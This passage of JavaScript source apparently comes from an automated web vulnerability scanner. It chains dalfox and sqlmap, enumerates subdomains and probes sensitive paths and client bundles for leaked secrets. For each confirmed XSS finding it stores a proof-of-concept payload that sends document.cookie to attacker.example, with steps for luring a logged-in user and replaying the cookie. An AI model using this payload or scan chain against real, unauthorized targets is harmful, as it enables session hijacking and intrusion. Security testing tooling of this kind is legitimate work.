        const out = `${res.stdout || ''}\n${res.stderr || ''}`.trim()
        if (out) {
          const { findings } = extractFindingsFromOutput('dalfox', out, url, this._catchAllBaselines.get(scanId) || null)
          for (const f of findings) {
            const stored = await this.ingestFinding(scanId, { ...f, module: `chain:dalfox` }, { verify, targetType })
            // Always attach session-hijack PoC for each confirmed XSS
            if (stored) {
              const pocPayload = `<script>new Image().src='https://attacker.example/c?c='+encodeURIComponent(document.cookie)</script>`
              db.run(`UPDATE findings SET poc = ? WHERE id = ?`, JSON.stringify({
                type: 'session-hijack',
                payload: pocPayload,
                impact: 'Injects a beacon that exfiltrates the victim session cookie to an attacker-controlled host, enabling full account takeover when the XSS fires in an authenticated browser.',
                steps: [
                  'Host a listener (e.g. https://webhook.site or burp collaborator) as the exfil endpoint',
                  `Inject the payload into the vulnerable parameter of ${url}`,
                  'Trick an authenticated user into visiting the injected URL',
                  'Replay the captured session cookie to hijack the account',
                ],
              }), stored.id)
              this.log(scanId, 'info', `⚔️ Attached session-hijack PoC to XSS finding on ${url.slice(0, 80)}`)
            }
          }
        }
      } catch (e) { this.log(scanId, 'warn', `  dalfox chaining error: ${e.message}`) }

      await this.waitIfPaused(scanId)
      // sqlmap only makes sense when the URL actually carries query parameters
      if (/\?[^=]+=/.test(url)) {
        try {
          this.log(scanId, 'info', `  🎯 sqlmap → ${url.slice(0, 90)}\n$ ${previewNativeCommand('sqlmap', url)}`)
          const res = await runNativeTool('sqlmap', url, { owner: scanId })
          const out = `${res.stdout || ''}\n${res.stderr || ''}`.trim()
          if (out) {
            const { findings } = extractFindingsFromOutput('sqlmap', out, url, this._catchAllBaselines.get(scanId) || null)
            for (const f of findings) {
              await this.ingestFinding(scanId, { ...f, module: `chain:sqlmap` }, { verify, targetType })
            }
          }
        } catch (e) { this.log(scanId, 'warn', `  sqlmap chaining error: ${e.message}`) }
      }
    }
  }

  /** Quick WordPress fingerprint — used to skip wpscan on non-WP targets. */
  async _isWordPress(target) {
    const url = /^https?:\/\//i.test(target) ? target : `https://${target}`
    try {
      const res = await fetch(url, { method: 'GET', redirect: 'follow', signal: AbortSignal.timeout(10000) })
      const body = (await res.text()).slice(0, 500000)
      return /wp-content|wp-includes|wp-json|wordpress/i.test(body)
    } catch {
      return false
    }
  }

  /**
   * Subdomain discovery: passive (subfinder/amass) then active DNS brute-force
   * (gobuster dns).
   * Each live subdomain is then probed for Swagger/OpenAPI docs.
   */
  async _runSubdomainDiscovery(scanId, target, { verify } = {}) {
    const host = (() => {
      try { return new URL(/^https?:\/\//i.test(target) ? target : `https://${target}`).hostname }
      catch { return projectHost(target).host }
    })()
    const rootDomain = getRootDomain(host)   // e.g. imaluum.iium.edu.my -> iium.edu.my
    if (!rootDomain || !rootDomain.includes('.')) return

    this.log(scanId, 'info', `🔎 Enumerating subdomains for ${rootDomain} (passive + brute-force)...`)
    const subs = new Set()

    // Passive: subfinder
    try {
      this.log(scanId, 'info', `🔎 $ subfinder -d ${rootDomain}`)
      const r = await runNativeTool('subfinder', rootDomain, { owner: scanId })
      for (const line of (r.stdout || '').split('\n')) {
        const h = line.trim().toLowerCase()
        if (/^[a-z0-9.-]+\.[a-z]{2,}$/.test(h) && (h === rootDomain || h.endsWith('.' + rootDomain))) {
          subs.add(h)
        }
      }
    } catch { /* optional */ }

    // Active: gobuster dns brute-force
    // The random-subdomain wildcard probe that used to run here was inert:
    // dnsbrute.args normalises its input through toRootDomain, so both calls hit
    // the identical target and `probe` was never compared against `brute`.
    // Wildcard DNS is handled downstream by the subdomain-takeover checks.
    // Skip if rootDomain looks like a bare TLD (e.g., edu.my, co.uk) — gobuster fails on these
    const domainParts = rootDomain.split('.')
    if (domainParts.length >= 2 && rootDomain.match(/^[a-z0-9-]+\./) && !rootDomain.match(/^(com?|org|net|edu|gov|mil|ac|co|sch|go|or|ne|re)\./)) {
      try {
        this.log(scanId, 'info', `🔎 $ dnsrecon -d ${rootDomain} -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt --threads 30`)
        const brute = await runNativeTool('dnsbrute', rootDomain, { owner: scanId })
        for (const line of (brute.stdout || '').split('\n')) {
          const m = line.match(/([a-z0-9.-]+\.[a-z]{2,})/i)
          if (m) {
            const foundHost = m[1].toLowerCase()
            if (foundHost === rootDomain || foundHost.endsWith('.' + rootDomain)) {
              subs.add(foundHost)
            }
          }
        }
      } catch { /* optional */ }
    } else {
      this.log(scanId, 'info', '🔎 Skipping DNS brute-force — rootDomain appears to be a TLD')
    }

    if (!subs.size) {
      this.log(scanId, 'info', '🔎 No additional subdomains discovered')
    } else {
      this.log(scanId, 'info', `🔎 Discovered ${subs.size} subdomains: ${[...subs].slice(0, 10).join(', ')}${subs.size > 10 ? '…' : ''}`)
      // ONE consolidated finding instead of N individual spam findings
      const subList = [...subs].sort()
      await this.ingestFinding(scanId, {
        title: `Subdomain enumeration — ${subs.size} subdomains discovered`,
        severity: 'info',
        cweId: 'CWE-200',
        owaspCategory: 'A02:2025-Security Misconfiguration',
        description: `DNS enumeration discovered ${subs.size} subdomains for ${rootDomain}. Each subdomain expands the attack surface and should be inventoried. Subdomains: ${subList.join(', ')}`,
        remediation: 'Ensure all subdomains are inventoried and decommission unused ones. Review each for security posture.',
        module: 'subdomain-enum',
        evidence: { rootDomain, count: subs.size, subdomains: subList.slice(0, 50) },
      }, { verify })
    }

    // Probe main target + top subdomains for Swagger / OpenAPI docs
    const hostsToProbe = [host, ...subs].filter(h => h === rootDomain || h.endsWith('.' + rootDomain)).slice(0, 5)
    let swaggerHits = 0
    for (const h of hostsToProbe) {
      await this.waitIfPaused(scanId)
      const hit = await this._probeApiDocs(scanId, h, { verify })
      if (hit) swaggerHits++
    }

    // ── SUBDOMAIN SCAN CASCADE: scan top subdomains for HTTP headers + sensitive paths ──
    // Strictly limited to subdomains of the target rootDomain
    // Runs in parallel batches of 5 for performance (vs sequential which took 15-30 min)
    // Cap raised 5 -> 12: a live subdomain that never gets crawled is an unscanned
    // host, which is exactly how `hall-of-fame.<target>` kept only header coverage.
    // Subdomains that actually answer 200/401/403 are then promoted to a full sweep
    // including client-side bundle auditing; dead ones stay on the cheap path.
    const validSubs = [...subs].filter(s => s === rootDomain || s.endsWith('.' + rootDomain))
    if (validSubs.length > 0) {
      const topSubs = validSubs.slice(0, 12)
      this.log(scanId, 'info', `🔎 Cascading baseline scan to ${topSubs.length} subdomains under ${rootDomain}...`)
      // Run ALL subdomains in parallel (not in batches of 5 sequentially)
      const results = await Promise.allSettled(
        topSubs.map(sub => this.auditHttpBaseline(scanId, sub, { verify, targetType: 'url', fastMode: true }))
      )
      const scanned = results.filter(r => r.status === 'fulfilled').length
      this.progress(scanId, 8 + 4)
      if (scanned > 0) {
        this.log(scanId, 'info', `🔎 Subdomain cascade complete: ${scanned}/${topSubs.length} subdomains audited`)
      }

      // Deep pass: a live subdomain is its own application with its own routing,
      // bundle and admin surface. Probe each for reachability first so dead hosts
      // never pay for the full 50-path sweep, then re-audit the live ones without
      // fastMode (full path list + JS bundle audit + admin portals).
      const liveSubs = []
      await Promise.allSettled(topSubs.map(async (sub) => {
        try {
          const { response: res } = await fetchWithHttpFallback(sub, {
            method: 'GET',
            redirect: 'follow',
            signal: AbortSignal.timeout(8000),
          })
          if (res && [200, 401, 403].includes(res.status)) liveSubs.push(sub)
        } catch { /* unreachable subdomain — skip deep pass */ }
      }))
      if (liveSubs.length) {
        this.log(scanId, 'info', `🔎 Deep-probing ${liveSubs.length} live subdomain(s): ${liveSubs.join(', ')}`)
        const deep = await Promise.allSettled(
          liveSubs.map(sub => this.auditHttpBaseline(scanId, sub, { verify, targetType: 'url', fastMode: false }))
        )
        const deepScanned = deep.filter(r => r.status === 'fulfilled').length
        if (deepScanned > 0) {
          this.log(scanId, 'info', `🔎 Subdomain deep pass complete: ${deepScanned}/${liveSubs.length} live subdomains fully audited`)
        }
      }
    }
  }

  /**
   * Probe a host for Swagger/OpenAPI documentation. If found, record a finding
   * and feed every parameterized endpoint into the injection-chaining pool.
   */
  async _probeApiDocs(scanId, host, { verify } = {}) {
    const candidates = []
    for (const scheme of ['https', 'http']) {
      for (const p of ['/swagger-ui.html', '/swagger-ui/', '/api-docs', '/v2/api-docs', '/v3/api-docs', '/openapi.json', '/swagger.json', '/api/swagger-ui.html']) {
        candidates.push(`${scheme}://${host}${p}`)
      }
    }
    for (const url of candidates) {
      try {
        const res = await fetch(url, { redirect: 'follow', signal: AbortSignal.timeout(1500) })
        if (!res.ok) continue
        const body = (await res.text()).slice(0, 2_000_000)
        const isJsonSpec = /"swagger"\s*:|"openapi"\s*:/.test(body)
        const isSwaggerUi = /swagger-ui|SwaggerUIBundle/i.test(body)
        if (!isJsonSpec && !isSwaggerUi) continue

        const title = isJsonSpec ? 'Exposed OpenAPI/Swagger Specification' : 'Exposed Swagger UI'
        await this.ingestFinding(scanId, {
          title: `${title} — ${url}`,
          severity: 'medium',
          cweId: 'CWE-200',
          owaspCategory: 'A02:2025-Security Misconfiguration',
          description: `API documentation is publicly accessible at ${url}. This discloses the full API surface (endpoints, parameters, auth schemes) to attackers.`,
          remediation: 'Restrict access to API documentation (auth, IP allowlist) in production.',
          module: 'api-discovery',
          evidence: { url, spec: isJsonSpec },
        }, { verify })
        this.log(scanId, 'info', `📋 ${title} at ${url}`)

        // If it's the raw spec, extract parameterized endpoints for chaining
        if (isJsonSpec) {
          try {
            const spec = JSON.parse(body)
            const basePath = spec.basePath || (spec.servers?.[0]?.url || '')
            const base = `${new URL(url).origin}${basePath}`.replace(/\/$/, '')
            const endpoints = []
            for (const [path, ops] of Object.entries(spec.paths || {})) {
              const full = `${base}${path}`
              const params = []
              for (const op of Object.values(ops || {})) {
                for (const prm of (op.parameters || [])) {
                  if (prm.in === 'query' && prm.name) params.push(prm.name)
                }
              }
              if (params.length) {
                endpoints.push(`${full}?${[...new Set(params)].slice(0, 3).map(n => `${n}=1`).join('&')}`)
              }
              if (/\{[^}]+\}/.test(path)) {
                endpoints.push(full.replace(/\{[^}]+\}/g, '1'))
              }
            }
            if (endpoints.length) {
              this._collectUrls(scanId, endpoints.slice(0, 30))
              this.log(scanId, 'info', `📋 Extracted ${endpoints.length} API endpoints from spec → queued for injection testing`)
            }
          } catch { /* malformed spec */ }
        }
        return // one hit per host is enough
      } catch { /* try next */ }
    }
    return false // no hit
  }

  /**
   * Client-side JavaScript bundle audit.
   *
   * HTML/header scanners are blind to single-page apps: the routes, API surface
   * and sometimes credentials live inside `assets/index-*.js`, not the served
   * document. This fetches the entry document, follows its script tags, and
   * greps the bundles for API routes, secret-looking literals and auth-token
   * storage keys. Findings are evidence-gated: a match must carry the actual
   * surrounding snippet, and secret findings require a value-shaped token, so a
   * minified word like `password` in a variable name cannot raise a card.
   */
  async auditClientBundle(scanId, targetUrl, { verify } = {}) {
    const base = String(targetUrl || '').replace(/\/+$/, '')
    if (!base) return { scripts: 0, endpoints: 0, secrets: 0 }

    let html = ''
    try {
      const res = await fetch(base, {
        redirect: 'follow',
        headers: { 'user-agent': 'Mozilla/5.0 (compatible; SentinelAI/1.0)' },
        signal: AbortSignal.timeout(15000),
      })
      if (!res.ok) return { scripts: 0, endpoints: 0, secrets: 0 }
      html = (await res.text()).slice(0, 3_000_000)
    } catch {
      return { scripts: 0, endpoints: 0, secrets: 0 }
    }

    // Collect same-origin script URLs from src attributes and ES module imports.
    const scriptUrls = new Set()
    for (const m of html.matchAll(/<script[^>]+src\s*=\s*["']([^"']+)["']/gi)) {
      scriptUrls.add(m[1])
    }
    for (const m of html.matchAll(/["']([^"']*\.m?js(?:\?[^"']*)?)["']/gi)) {
      scriptUrls.add(m[1])
    }

    const resolved = []
    for (const raw of scriptUrls) {
      try {
        const u = new URL(raw, base + '/')
        if (u.origin !== new URL(base).origin) continue
        if (!/\.m?js(\?|$)/i.test(u.pathname)) continue
        resolved.push(u.href)
      } catch { /* skip unparsable */ }
    }
    // Entry bundle first, then everything else; cap the fan-out.
    resolved.sort((a, b) => (/index[.-]/i.test(b) ? 1 : 0) - (/index[.-]/i.test(a) ? 1 : 0))
    const targets = [...new Set(resolved)].slice(0, 12)
    if (!targets.length) return { scripts: 0, endpoints: 0, secrets: 0 }

    const apiRoutes = new Set()
    const secretHits = []
    const storageHits = new Set()
    let fetched = 0
    let bundleBytes = 0

    // Placeholder/example values that look secret-shaped but carry no real data.
    const PLACEHOLDER = /^(?:x{3,}|0{4,}|your[_-]?|changeme|example|placeholder|dummy|test[_-]?key|undefined|null|true|false|\{\{.*?\}\}|<.*?>)$/i

    for (const url of targets) {
      await this.waitIfPaused(scanId)
      let body = ''
      try {
        const r = await fetch(url, {
          redirect: 'follow',
          headers: { 'user-agent': 'Mozilla/5.0 (compatible; SentinelAI/1.0)' },
          signal: AbortSignal.timeout(15000),
        })
        if (!r.ok) continue
        body = (await r.text()).slice(0, 5_000_000)
        fetched++
        bundleBytes += body.length
      } catch { continue }

      // API routes: absolute paths inside fetchers, axios calls and string literals.
      for (const m of body.matchAll(/["'`](\/api\/[A-Za-z0-9_\-./{}$:]{2,120})["'`]/g)) {
        const p = m[1].split('?')[0]
        if (/\$\{|\{\{|%s/.test(p)) continue
        apiRoutes.add(p)
      }
      for (const m of body.matchAll(
        /(?:https?:\/\/[A-Za-z0-9_.\-]+)?(\/(?:v[1-3]|rest|graphql|internal)(?:\/[A-Za-z0-9_\-./{}:]{0,120})?)["'`]/g,
      )) {
        const p = m[1].split('?')[0]
        if (/\$\{|\{\{/.test(p)) continue
        // Drop the bare-prefix duplicate produced when the `/api/x` form already matched.
        if (/^\/(?:v[1-3]|rest|graphql|internal)$/.test(p) && !/\/graphql$/.test(p)) continue
        apiRoutes.add(p)
      }

      // Auth-token storage keys: the exact pattern the reviewer asked for.
      for (const m of body.matchAll(
        /(?:localStorage|sessionStorage)\s*\.\s*setItem\s*\(\s*["'`]([^"'`]{1,80})["'`]/g,
      )) {
        storageHits.add(m[1])
      }
      for (const m of body.matchAll(
        /(?:localStorage|sessionStorage)\s*\[\s*["'`]([^"'`]{1,80})["'`]\s*\]\s*=/g,
      )) {
        storageHits.add(m[1])
      }

      // Secret-shaped literals. Require a real value, not a name or placeholder.
      const secretPatterns = [
        { kind: 'AWS Access Key ID', re: /\b(AKIA[0-9A-Z]{16})\b/g, sev: 'high' },
        { kind: 'Google API Key', re: /\b(AIza[0-9A-Za-z\-_]{35})\b/g, sev: 'high' },
        { kind: 'Stripe Live Secret Key', re: /\b(sk_live_[0-9A-Za-z]{16,})\b/g, sev: 'critical' },
        { kind: 'Slack Token', re: /\b(xox[abprs]-[0-9A-Za-z\-]{10,})/g, sev: 'high' },
        { kind: 'Private Key Block', re: /(-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----)/g, sev: 'critical' },
        { kind: 'JSON Web Token', re: /\b(eyJ[A-Za-z0-9_\-]{8,}\.eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,})/g, sev: 'medium' },
        {
          kind: 'Hardcoded Credential Assignment',
          re: /(?:api[_-]?key|secret|passwd|password|auth[_-]?token|access[_-]?token)\s*[:=]\s*["'`]([A-Za-z0-9+/_\-]{16,64})["'`]/gi,
          sev: 'medium',
          valueGroup: 1,
        },
      ]
      for (const pat of secretPatterns) {
        for (const m of body.matchAll(pat.re)) {
          const value = m[pat.valueGroup ?? 1]
          if (!value || PLACEHOLDER.test(value)) continue
          // Reject obvious runtime interpolation and repeated-character filler.
          if (/^\$\{|\{\{|%s|<%/.test(value)) continue
          if (new Set(value).size < 6) continue
          // Keep the literal but redact the middle so the report does not leak a live key.
          const redacted = value.length > 12
            ? `${value.slice(0, 6)}…${value.slice(-4)}`
            : `${value.slice(0, 2)}…`
          secretHits.push({
            kind: pat.kind,
            sev: pat.sev,
            bundle: url,
            redacted,
            context: m[0].slice(0, 200).replace(/\s+/g, ' '),
          })
        }
      }
    }

    if (!fetched) return { scripts: 0, endpoints: 0, secrets: 0 }

    const host = (() => { try { return new URL(base).host } catch { return base } })()

    // ── Finding 1: API surface disclosed by the bundle ──
    if (apiRoutes.size) {
      const routes = [...apiRoutes].sort()
      await this.ingestFinding(scanId, {
        title: `Client Bundle Discloses ${routes.length} API Route${routes.length === 1 ? '' : 's'}`,
        severity: 'low',
        cweId: 'CWE-200',
        owaspCategory: 'A01:2025-Broken Access Control',
        description: `The JavaScript bundles served by ${host} embed ${routes.length} API route${routes.length === 1 ? '' : 's'} that are not discoverable by crawling the rendered HTML. These paths expand the authenticated attack surface and were queued for injection testing.`,
        remediation: 'Treat client-side route strings as public. Enforce authorization server-side on every one of these endpoints; move any secret or privileged path out of the bundle.',
        module: 'js-bundle-audit',
        evidence: {
          url: base,
          bundlesScanned: fetched,
          bytesScanned: bundleBytes,
          routeCount: routes.length,
          routes: routes.slice(0, 60),
          sample: routes.slice(0, 15),
        },
      }, { verify })
      // Feed them into the URL pool so the injection chain gets a shot at them.
      this._collectUrls(scanId, routes.slice(0, 40).map(p => `${base}${p}`))
      this.log(scanId, 'info', `🧩 JS bundle audit: ${routes.length} API routes extracted from ${fetched} bundle(s) → queued for probing`)
    }

    // ── Finding 2: secret-shaped literals in the bundle (grouped by kind) ──
    if (secretHits.length) {
      const byKind = new Map()
      for (const h of secretHits) {
        if (!byKind.has(h.kind)) byKind.set(h.kind, [])
        byKind.get(h.kind).push(h)
      }
      for (const [kind, hits] of byKind) {
        const worst = hits.some(h => h.sev === 'critical') ? 'critical'
          : hits.some(h => h.sev === 'high') ? 'high' : 'medium'
        await this.ingestFinding(scanId, {
          title: `${kind} Exposed in Client Bundle (${hits.length})`,
          severity: worst,
          cweId: 'CWE-798',
          owaspCategory: 'A07:2025-Authentication Failures',
          description: `${hits.length} ${kind} value${hits.length === 1 ? '' : 's'} found in JavaScript served to unauthenticated clients on ${host}. Anything shipped in a bundle must be considered public. Evidence captured: ${hits[0].context}`,
          remediation: 'Rotate the exposed credential immediately, then move the call to a server-side proxy and keep the key in server environment variables.',
          module: 'js-bundle-audit',
          evidence: {
            url: hits[0].bundle,
            kind,
            count: hits.length,
            // Literal kept, middle redacted, plus the index keys the contract trusts.
            matches: hits.slice(0, 10).map(h => ({ bundle: h.bundle, value: h.redacted })),
            snippet: hits[0].context,
            body: hits.map(h => h.context).join('\n').slice(0, 4000),
          },
        }, { verify })
      }
      this.log(scanId, 'warn', `🔑 JS bundle audit: ${secretHits.length} secret-shaped literal(s) across ${byKind.size} kind(s)`)
    }

    // ── Finding 3: auth material stored client-side ──
    if (storageHits.size) {
      const keys = [...storageHits].sort()
      const sensitive = keys.filter(k => /token|auth|jwt|session|secret|key|credential|pass/i.test(k))
      if (sensitive.length) {
        await this.ingestFinding(scanId, {
          title: `Authentication Material Persisted in Web Storage (${sensitive.length})`,
          severity: 'medium',
          cweId: 'CWE-922',
          owaspCategory: 'A07:2025-Authentication Failures',
          description: `${host} writes authentication material to browser storage under ${sensitive.length} key${sensitive.length === 1 ? '' : 's'}: ${sensitive.slice(0, 10).join(', ')}. Web storage is readable by any script on the origin, so a single XSS yields a durable token theft with no HttpOnly protection.`,
          remediation: 'Store session tokens in HttpOnly, Secure, SameSite cookies instead of localStorage/sessionStorage.',
          module: 'js-bundle-audit',
          evidence: {
            url: base,
            storageKeys: sensitive.slice(0, 30),
            allKeys: keys.slice(0, 40),
            bundlesScanned: fetched,
          },
        }, { verify })
      }
    }

    return { scripts: fetched, endpoints: apiRoutes.size, secrets: secretHits.length }
  }

  /**
   * Baseline web audit: HTTP security headers + common sensitive paths.
   * Always executed for URL targets — engine-agnostic and high-signal.
   */
  async auditHttpBaseline(scanId, target, { verify, targetType = 'url', fastMode = false } = {}) {
    let targetUrl = String(target || '').trim()

    // 1. Audit HTTP Security Headers (deduplicated per scan: one consolidated finding)
    try {
      this.log(scanId, 'info', `▶ Auditing Security Headers on ${targetUrl}...`)
      let res
      try {
        const result = await fetchWithHttpFallback(targetUrl, { method: 'HEAD', redirect: 'follow', signal: AbortSignal.timeout(15000) })
        res = result.response
        targetUrl = result.url.replace(/\/+$/, '')
      } catch {
        try {
          const result = await fetchWithHttpFallback(targetUrl, { method: 'GET', redirect: 'follow', signal: AbortSignal.timeout(15000) })
          res = result.response
          targetUrl = result.url.replace(/\/+$/, '')
        } catch { res = null }
      }
      if (res && res.headers) {
        const headers = Object.fromEntries(res.headers.entries())
        const missing = []
        if (!headers['strict-transport-security']) missing.push('Strict-Transport-Security (HSTS)')
        if (!headers['content-security-policy']) missing.push('Content-Security-Policy (CSP)')
        if (!headers['x-frame-options']) missing.push('X-Frame-Options')
        if (!headers['x-content-type-options']) missing.push('X-Content-Type-Options')
        if (!headers['referrer-policy']) missing.push('Referrer-Policy')
        if (!headers['permissions-policy']) missing.push('Permissions-Policy')
        if (missing.length) {
          const sev = missing.some(m => m.startsWith('Content-Security') || m.startsWith('X-Frame')) ? 'medium' : 'low'
          await this.ingestFinding(scanId, {
            title: `Missing Security Headers (${missing.length})`,
            severity: sev,
            cweId: 'CWE-693',
            owaspCategory: 'A02:2025-Security Misconfiguration',
            description: `The target ${targetUrl} is missing ${missing.length} recommended HTTP security headers: ${missing.join(', ')}. This weakens defenses against clickjacking, MIME-sniffing, and XSS.`,
            remediation: 'Configure the web server to send: Strict-Transport-Security, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.',
            module: 'http-headers',
            // `missing`/`present` are derived lists, not a capture, so the report
            // contract could not classify this card as confirmed and filed it under
            // unverified leads — even though six absent headers were observed
            // directly. Persist the response line and the real header block under
            // keys the contract already trusts.
            evidence: {
              url: targetUrl,
              status: res.status,
              headers: Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\n'),
              responseHeaders: Object.fromEntries(Object.entries(headers)),
              missing,
              present: Object.keys(headers),
            },
          }, { verify })
        }
        if (headers['server']) {
          await this.ingestFinding(scanId, {
            title: `Server Header Information Disclosure (${headers['server']})`,
            severity: 'info',
            cweId: 'CWE-200',
            owaspCategory: 'A02:2025-Security Misconfiguration',
            description: `The server advertises banner details: ${headers['server']}`,
            remediation: 'Suppress or obfuscate the Server HTTP header.',
            module: 'http-headers',
            evidence: { url: targetUrl, server: headers['server'] },
          }, { verify })
        }
      }
    } catch (err) {
      this.log(scanId, 'warn', `Header audit warning: ${err.message}`)
    }

    // 2. SPA catch-all detection — if every path returns identical 200 HTML, skip enumeration
    let isSpaCatchAll = false
    try {
      const probe1 = await fetch(`${targetUrl.replace(/\/$/, '')}/__spa_probe_${Date.now()}__.html`, { method: 'GET', signal: AbortSignal.timeout(5000) })
      const probe2 = await fetch(`${targetUrl.replace(/\/$/, '')}/__spa_probe_${Date.now() + 1}__.html`, { method: 'GET', signal: AbortSignal.timeout(5000) })
      if (probe1.status === 200 && probe2.status === 200) {
        const t1 = (await probe1.text()).slice(0, 500)
        const t2 = (await probe2.text()).slice(0, 500)
        if (t1 === t2 && t1.length > 100) {
          isSpaCatchAll = true
          this.log(scanId, 'info', '📱 SPA catch-all routing detected — skipping path enumeration (all paths return index.html)')
        }
      }
    } catch { /* non-fatal */ }

    // 3. Audit Sensitive Paths (expanded for offensive coverage) — skip if SPA
    // fastMode is used when cascading to subdomains: the parent host already
    // received the full 50-path sweep, so subdomains only get high-signal paths
    // instead of repeating all 50 (each with an 8s timeout) per subdomain.
    if (!isSpaCatchAll) {
      const allPaths = ['/robots.txt', '/.git/HEAD', '/.env', '/sitemap.xml',
        '/.git/config', '/.svn/entries', '/backup.zip', '/backup.tar.gz', '/db.sql', '/dump.sql',
        '/phpinfo.php', '/server-status', '/actuator', '/actuator/env', '/actuator/heapdump',
        '/.well-known/security.txt', '/wp-config.php.bak', '/config.php.bak', '/web.config',
        '/api/.env', '/storage/logs/laravel.log', '/debug/vars', '/metrics', '/.DS_Store',
        '/crossdomain.xml', '/clientaccesspolicy.xml', '/elmah.axd', '/trace.axd',
        '/.aws/credentials', '/.dockercfg', '/id_rsa', '/id_ed25519', '/known_hosts',
        '/.htaccess', '/.htpasswd', '/wp-json/wp/v2/users', '/.tgitconfig',
        '/WEB-INF/web.xml', '/META-INF/maven', '/package.json', '/composer.json',
        '/console', '/admin/login', '/administrator', '/wp-admin', '/user/login',
        '/api/users', '/graphql', '/graphiql', '/.vscode/sftp.json', '/.idea/workspace.xml']
      const fastPaths = allPaths.filter(p => /^\/\.(env|git\/HEAD|git\/config|aws|dockercfg)$|^\/robots\.txt$|^\/backup\.(zip|tar\.gz)$|^\/db\.sql$|^\/dump\.sql$|^\/phpinfo\.php$|^\/server-status$|^\/admin\/login$|^\/wp-admin$|^\/api\/\.env$/.test(p))
      const paths = fastMode ? fastPaths : allPaths
      for (const p of paths) {
        await this.waitIfPaused(scanId)
        try {
          const checkUrl = joinUrl(targetUrl, p)
          const res = await fetch(checkUrl, { method: 'GET', signal: AbortSignal.timeout(8000) })
          if (res.status === 200) {
            const contentType = (res.headers.get('content-type') || '').toLowerCase()
            const text = await res.text()
            const isHtml = contentType.includes('text/html') || /<!doctype\s+html|<html[\s>]/i.test(text)

            if (p === '/.git/HEAD' && text.includes('ref:') && !isHtml) {
              await this.ingestFinding(scanId, {
                title: 'Exposed Git Repository (/.git/HEAD)',
                severity: 'high',
                cweId: 'CWE-538',
                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `Exposed Git directory discovered at ${checkUrl}. Attackers can download the entire source code history.`,
                remediation: 'Block access to /.git in your web server configuration.',
                module: 'path-enum',
                evidence: { url: checkUrl, snippet: text.slice(0, 150) },
              }, { verify })
            } else if ((p === '/.env' || p === '/api/.env') && !isHtml && (text.includes('DB_') || text.includes('APP_KEY') || text.includes('SECRET') || text.includes('KEY='))) {
              await this.ingestFinding(scanId, {
                title: `Exposed Environment Credentials File (${p})`,
                severity: 'critical',
                cweId: 'CWE-200',
                owaspCategory: 'A01:2025-Broken Access Control',
                description: `Exposed environment file at ${checkUrl} containing sensitive credentials/secrets.`,
                remediation: 'Remove public access to the .env file immediately and rotate all secrets it contains.',
                module: 'path-enum',
                evidence: { url: checkUrl, snippet: text.slice(0, 200).replace(/[A-Za-z0-9_]{16,}/g, '********') },
              }, { verify })
            } else if (p === '/.git/config' && text.includes('[core]') && !isHtml) {
              await this.ingestFinding(scanId, {
                title: 'Exposed Git Config (/.git/config)',
                severity: 'high',
                cweId: 'CWE-538',
                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `Git config exposed at ${checkUrl} — may disclose repo remotes and branch info; combined with /.git/HEAD the full source can often be reconstructed.`,
                remediation: 'Block access to /.git in your web server configuration.',
                module: 'path-enum',
                evidence: { url: checkUrl, snippet: text.slice(0, 200) },
              }, { verify })
            } else if (/backup\.(zip|tar\.gz)|dump\.sql|db\.sql/.test(p) && !isHtml && text.length > 100) {
              await this.ingestFinding(scanId, {
                title: `Exposed Backup/Database Dump (${p})`,
                severity: 'critical',
                cweId: 'CWE-530',
                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `A backup archive or SQL dump is publicly downloadable at ${checkUrl} (${text.length} bytes). This typically exposes full source code or database contents including credentials.`,
                remediation: 'Remove backup artifacts from the web root immediately and rotate any credentials they contain.',
                module: 'path-enum',
                evidence: { url: checkUrl, bytes: text.length },
              }, { verify })
            } else if (p === '/phpinfo.php' && (/php version|<title>phpinfo/i.test(text) || text.includes('Configuration File (php.ini) Path'))) {
              await this.ingestFinding(scanId, {
                title: 'phpinfo() Page Exposed',
                severity: 'medium',
                cweId: 'CWE-200',
                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `phpinfo() at ${checkUrl} discloses PHP version, loaded modules, paths, and environment variables.`,
                remediation: 'Delete phpinfo.php from production.',
                module: 'path-enum',
                evidence: { url: checkUrl },
              }, { verify })
            } else if (p === '/actuator/heapdump' && (contentType.includes('octet-stream') || text.startsWith('\x1f\x8b') || text.includes('JAVA PROFILE'))) {
              await this.ingestFinding(scanId, {
                title: `Spring Boot Actuator Exposed (${p})`,
                severity: 'high',
                cweId: 'CWE-200',
                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `Spring Actuator endpoint ${checkUrl} is publicly accessible — provides a full JVM heap dump with potential memory credentials.`,
                remediation: 'Restrict actuator endpoints to management port/internal network and require authentication.',
                module: 'path-enum',
                evidence: { url: checkUrl, contentType },
              }, { verify })
            } else if (p.startsWith('/actuator') && !isHtml && (contentType.includes('json') || (text.trim().startsWith('{') && (text.includes('"_links"') || text.includes('"propertySources"') || text.includes('"activeProfiles"'))))) {
              await this.ingestFinding(scanId, {
                title: `Spring Boot Actuator Exposed (${p})`,
                severity: p.includes('env') ? 'high' : 'medium',
                cweId: 'CWE-200',
                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `Spring Actuator endpoint ${checkUrl} is publicly accessible — can disclose env vars, beans, mappings, or system metadata.`,
                remediation: 'Restrict actuator endpoints to management port/internal network and require authentication.',
                module: 'path-enum',
                evidence: { url: checkUrl, contentType },
              }, { verify })
            } else if (p === '/server-status' && !isHtml && /apache status|server uptime/i.test(text)) {
              await this.ingestFinding(scanId, {
                title: 'Apache server-status Exposed',
                severity: 'medium',
                cweId: 'CWE-200',
                owaspCategory: 'A02:2025-Security Misconfiguration',
                description: `mod_status page at ${checkUrl} discloses requests, vhosts, and internal IPs.`,
                remediation: 'Disable mod_status or restrict to localhost.',
                module: 'path-enum',
                evidence: { url: checkUrl },
              }, { verify })
            } else if (p === '/storage/logs/laravel.log' && !isHtml && (text.includes('local.ERROR') || text.includes('production.ERROR') || /\[\d{4}-\d{2}-\d{2}/.test(text))) {
              await this.ingestFinding(scanId, {
                title: `Sensitive Laravel Log File Exposed (${p})`,
                severity: 'medium',
                cweId: 'CWE-538',
